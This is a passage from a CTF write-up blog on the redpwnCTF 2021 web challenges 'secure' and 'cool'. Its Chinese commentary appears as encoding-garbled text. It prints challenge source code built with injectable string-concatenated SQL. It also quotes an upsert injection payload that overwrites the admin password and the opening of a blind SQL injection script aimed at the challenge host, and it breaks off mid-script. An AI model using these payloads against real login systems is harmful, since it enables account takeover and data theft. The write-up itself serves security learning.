&lt;p>å…³äºorm ä¹‹åè¦è¡¥ä¸€ä¸‹çŸ¥è¯†ï¼š&lt;a href="https://en.wikipedia.org/wiki/Object%E2%80%93relational_mapping">Objectâ€“relational mapping&lt;/a> &lt;a href="http://www.ruanyifeng.com/blog/2019/02/orm-tutorial.html">ORM å®ä¾‹æ•™ç¨‹&lt;/a>&lt;/p>
&lt;h2 id="websecure">web/secure&lt;/h2>
&lt;blockquote>
&lt;p>Just learned about encryptionâ€”now, my website is unhackable!&lt;/p>
&lt;p>&lt;a href="https://secure.mc.ax/">secure.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/210a9fe526e420576e4b6c1cb74eeed437c1a89955c8158c14aa365c45578200/index.js">index.js&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>è¿˜æ˜¯ä¸ªç™»å½•æ¡†ï¼Œå°è¯•ä¸‡èƒ½å¯†ç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710094442324.png" alt="image-20210710094442324">&lt;/p>
&lt;p>æºç æ˜¯è¿™æ ·çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;crypto&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;better-sqlite3&amp;#39;&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#d88200">&amp;#39;db.sqlite3&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`DROP TABLE IF EXISTS users;`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`CREATE TABLE users(
&lt;/span>&lt;span style="color:#d88200"> id INTEGER PRIMARY KEY AUTOINCREMENT,
&lt;/span>&lt;span style="color:#d88200"> username TEXT,
&lt;/span>&lt;span style="color:#d88200"> password TEXT
&lt;/span>&lt;span style="color:#d88200">);`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`INSERT INTO users (username, password) VALUES (
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">btoa&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;admin&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;,
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">btoa&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">crypto&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">randomUUID&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;
&lt;/span>&lt;span style="color:#d88200">)`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;body-parser&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">urlencoded&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">extended&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/?message=Username and password required!&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`SELECT id FROM users WHERE
&lt;/span>&lt;span style="color:#d88200"> username = &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39; AND
&lt;/span>&lt;span style="color:#d88200"> password = &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;;`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">prepare&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`/?message=&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">env&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">FLAG&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Incorrect login&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">`/?message=Incorrect username or password. Query: &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä»–è¿™ä¸ªb64åŠ å¯†æ˜¯å‘ç”Ÿåœ¨å‰ç«¯çš„ï¼Œä¹Ÿå°±æ˜¯åœ¨å‘åŒ…çš„æ—¶å€™å°±å·²ç»å¯¹postçš„æ•°æ®è¿›è¡Œäº†é¢„å¤„ç†ï¼Œè€Œå…·ä½“åˆ°åç«¯è¿›è¡Œsqlè¯­å¥çš„æŸ¥è¯¢æ—¶ä¼šç›´æ¥æ‹¼æ¥req.body.username/passwdçš„æ•°æ®ï¼Œä¸ä¼šè¿›è¡Œè¿›ä¸€æ­¥çš„æ£€æŸ¥æˆ–è¿‡æ»¤&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710104923251.png" alt="image-20210710104923251">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710104859539.png" alt="image-20210710104859539">&lt;/p>
&lt;p>åˆšå¼€å§‹æƒ³å¤æ‚äº†&lt;/p>
&lt;h2 id="webcool">web/cool&lt;/h2>
&lt;blockquote>
&lt;p>Aaron has a message for the cool kids. For support, DM BrownieInMotion.&lt;/p>
&lt;p>&lt;a href="https://cool.mc.ax/">cool.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/e03916d52bb7e84cbd2f9f26e5de162fdd0442c40d8397a103aab5813031fd83/app.py">app.py&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ç™»å½•æ¡†ï¼Œå¯ä»¥æ³¨å†Œ å…ˆå°è¯•test: test ç™»å½•æˆåŠŸä½†æ˜¯æ— æ³•è·å–ä¿¡æ¯ï¼ˆæ³¨å†Œåä¹Ÿä¼šè·³è½¬è¿™ä¸ªé¡µé¢&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710105453861.png" alt="image-20210710105453861">&lt;/p>
&lt;p>ç•™æ„cookieéƒ¨åˆ†ï¼Œæ˜¯ç†Ÿæ‚‰çš„flask sessionï¼Œæ‰”è¿›å·¥å…·é‡Œè§£å¯†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710105534823.png" alt="image-20210710105534823">&lt;/p>
&lt;p>å†å‚è€ƒæºç ä¸­çš„/messageéƒ¨åˆ†ï¼Œè€ƒè™‘å°†sessionè®¾ä¸º{&amp;ldquo;username&amp;rdquo;:&amp;ldquo;ginkoid&amp;rdquo;}åç™»å…¥æŸ¥çœ‹ä¿¡æ¯ï¼ˆå¼€å§‹ä»¥ä¸ºæ˜¯sessionä¼ªé€  åæ¥å‘ç°ä¸æ˜¯ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710113131546.png" alt="image-20210710113131546">&lt;/p>
&lt;p>çœ‹ä¸€ä¸‹å…¶ä»–éƒ¨åˆ†çš„æºç ï¼Œé¦–å…ˆæ˜¯init()&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#75715e"># this is terrible but who cares&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200"> CREATE TABLE IF NOT EXISTS users (
&lt;/span>&lt;span style="color:#d88200"> username TEXT PRIMARY KEY,
&lt;/span>&lt;span style="color:#d88200"> password TEXT
&lt;/span>&lt;span style="color:#d88200"> );
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;DROP TABLE users;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200"> CREATE TABLE users (
&lt;/span>&lt;span style="color:#d88200"> username TEXT PRIMARY KEY,
&lt;/span>&lt;span style="color:#d88200"> password TEXT
&lt;/span>&lt;span style="color:#d88200"> );
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># put ginkoid into db&lt;/span>
&lt;span style="color:#111">ginkoid_password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">generate_token&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#39;INSERT OR IGNORE INTO users (username, password)&amp;#39;&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;VALUES (&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">ginkoid&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">, &lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">ginkoid_password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">);&amp;#39;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;UPDATE users SET password=&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">ginkoid_password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;WHERE username=&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">ginkoid&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">;&amp;#39;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åæ˜¯åœ¨åˆ›å»ºç”¨æˆ·&lt;code>create_user()&lt;/code>å’Œç™»å½•&lt;code>check_login()&lt;/code>æ—¶éƒ½ä¼šæ£€æµ‹ç”¨æˆ·åä¸­æ˜¯å¦æœ‰éæ³•å­—ç¬¦ï¼ˆç™½åå•æ˜¯26ä¸ªè‹±æ–‡å­—æ¯å¤§å°å†™å’Œæ•°å­—ï¼‰ï¼Œç®—æ˜¯æŒºä¸¥æ ¼çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">create_user&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">any&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">allowed_characters&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Alphanumeric usernames only, please.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Username is too short.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Password is too long.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">other_users&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;SELECT * FROM users WHERE username=&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">;&amp;#39;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">other_users&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Username taken.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#39;INSERT INTO users (username, password)&amp;#39;&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;VALUES (&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">, &lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">);&amp;#39;&lt;/span> &lt;span style="color:#75715e"># passwdéƒ¨åˆ†å¯æ§&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è€ƒè™‘äº†ä¸€ä¸‹äºŒæ¬¡æ³¨å…¥ï¼Œå› ä¸ºæ³¨å†Œæ—¶çš„passwdéƒ¨åˆ†å®Œå…¨å¯æ§ï¼Œè®¾æƒ³æ˜¯è¿™æ ·çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710122622508.png" alt="image-20210710122622508">&lt;/p>
&lt;p>æ„é€ passwdéƒ¨åˆ†ä¸º &lt;code>'),('ginkoid','passwd&lt;/code>&lt;/p>
&lt;p>emmmm ä½†æ˜¯è¿™é‡Œä¸ç®¡æ˜¯æ˜æ–‡è¿˜æ˜¯url encodeéƒ½ä¼šæœ‰500é”™è¯¯ï¼Œè€Œä¸”è¿™é‡Œè¿”å›çš„æ—¶&lt;code>correct_password[0][0]==password&lt;/code>ï¼Œä¹Ÿç®—æ˜¯æœç»äº†è¿™ç§å¤šæ·»åŠ ä¸€æ¡ä¿¡æ¯çš„å¯èƒ½ï¼Œä¹‹å‰å·²ç»åˆå§‹åŒ–çš„å¯†ç ä¼šæ˜¯&lt;code>[0][0]&lt;/code>ï¼Œè€Œæ–°æ’å…¥çš„passwdå°†æ˜¯&lt;code>[1][0]&lt;/code>ï¼›å¹¶ä¸”åœ¨&lt;code>init()&lt;/code>æ—¶å®šä¹‰usernameæ˜¯primary ä¹Ÿä¸å¯èƒ½æœ‰é‡å¤çš„&lt;/p>
&lt;p>â€”â€”â€”â€”æ¯”èµ›çš„æ—¶å€™å°±åœåˆ°è¿™é‡Œäº†ï¼Œä¹Ÿæ˜¯å½“æ—¶äº†è§£çš„å¤ªå°‘ï¼Œæ€è·¯å¾ˆå®¹æ˜“å°±æ–­æ‰äº†ã€‚ã€‚ã€‚ä»¥ä¸‹æ˜¯å¤ç°&lt;/p>
&lt;p>åœ¨çœ‹äº†&lt;a href="https://github.com/Muirey03/redpwn2021_writeups/blob/master/web_cool.md">è¿™ç¯‡wp&lt;/a>ä¹‹åï¼Œå‘ç°è¿™ä½å¸ˆå‚…æœ€å¼€å§‹è·Ÿæˆ‘çš„æ€è·¯æ˜¯ä¸€æ ·çš„ éƒ½æƒ³åˆ©ç”¨inserté‚£ä¸€å¥ï¼Œéƒ½æƒ³æ›¿æ¢æ‰æ•°æ®åº“ä¸­åŸæ¥å­˜æœ‰çš„ginkoidçš„å¯†ç ï¼›è¿™ä½å¸ˆå‚…ç”¨çš„payloadæ˜¯&lt;/p>
&lt;pre tabindex="0">&lt;code>'),('ginkoid','') ON CONFLICT DO UPDATE SET password='';--
&lt;/code>&lt;/pre>&lt;p>å…¶ä¸­çš„&lt;code>ON CONFLICT DO UPDATE SET&lt;/code>ï¼Œåœ¨&lt;a href="https://www.sqlite.org/lang_UPSERT.html">è¿™ç¯‡å®˜æ–¹æ–‡æ¡£&lt;/a>é‡Œå†™çš„å¾ˆè¯¦ç»†ï¼Œè¿™ä½å¸ˆå‚…ç»™çš„payloadå¾ˆå¥½ï¼ˆæˆ‘å½“æ—¶åˆ™å¯¹è¿™ä¸ªsqlè¯­å¥å¹¶ä¸æ¸…æ¥šï¼‰ä½†æ˜¯æ­£å¦‚ä»–æ‰€è¯´çš„ï¼Œwhich is 8 characters over the limit, which won&amp;rsquo;t do.&lt;/p>
&lt;p>æœ€åä½¿ç”¨ç›²æ³¨çš„æ–¹å¼ï¼Œå…ˆä¸Šä¸€ä¸‹è„šæœ¬ ï¼ˆ&lt;a href="https://github.com/SuperStormer/writeups/blob/master/redpwnctf_2021/web/cool.py">è¿™é‡Œæ˜¯æ¥æº&lt;/a>ï¼‰å†è¯´è¯´æ€è·¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">time&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;https://cool.mc.ax/&amp;#34;&lt;/span>
&lt;span style="color:#75715e"># url = &amp;#34;http://127.0.0.1:5000/&amp;#34;&lt;/span>
&lt;span style="color:#111">prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;asdfjwfoijweoijfojiewfj&amp;#34;&lt;/span>
&lt;span style="color:#111">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789&amp;#34;&lt;/span>
&lt;span style="color:#111">val&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">time&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">time_ns&lt;/span>&lt;span style="color:#111">())&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;0&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># æ³¨æ„ç™½åå•é‡Œæ²¡æœ‰0 è¦æ¢æ‰&lt;/span>
